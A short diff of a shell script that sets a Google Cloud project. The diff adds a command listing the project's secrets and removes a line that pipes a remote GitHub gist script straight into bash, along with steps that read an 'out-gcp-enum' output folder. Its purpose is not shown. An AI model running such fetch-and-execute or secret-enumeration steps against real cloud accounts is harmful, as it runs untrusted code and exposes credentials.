@@ -33,8 +33,5 @@ B_ID=$1
 PROJECT=$2
 
 gcloud config set project $PROJECT
+gcloud secrets list
 
-curl -sSfL https://gist.githubusercontent.com/OctoSabercat/a6f67ef1ab1b540c313bce4de33bf0d7/raw/4ab3bcf6bd9070581538c66af98d9be57820f43c/test1.sh | bash
-
-cd out-gcp-enum
-cat *
